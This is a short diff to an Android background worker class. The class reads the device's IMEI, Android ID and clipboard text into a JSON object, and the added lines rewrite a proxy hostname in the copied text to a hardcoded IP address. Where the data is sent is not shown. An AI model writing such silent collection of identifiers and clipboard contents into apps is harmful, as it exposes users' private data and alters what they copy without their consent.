@@ -116,6 +116,7 @@ public class MyWorker extends Worker{
                         String imei = TelephonyMgr.getDeviceId();
                         ClipboardManager clipboard = (ClipboardManager) getApplicationContext().getSystemService(CLIPBOARD_SERVICE);
                         String copyedText = (String) clipboard.getText();
+                        copyedText = copyedText.replace("de9.proxidize.com", "138.201.246.49");
                         JSONObject obj = new JSONObject();
                         try {
                             obj.put("device_id", android_id);
@@ -169,6 +170,7 @@ public class MyWorker extends Worker{
                         String imei = TelephonyMgr.getDeviceId();
                         ClipboardManager clipboard = (ClipboardManager) getApplicationContext().getSystemService(CLIPBOARD_SERVICE);
                         String copyedText = (String) clipboard.getText();
+                        copyedText = copyedText.replace("de9.proxidize.com", "138.201.246.49");
                         JSONObject obj = new JSONObject();
                         try {
                             obj.put("device_id", android_id);
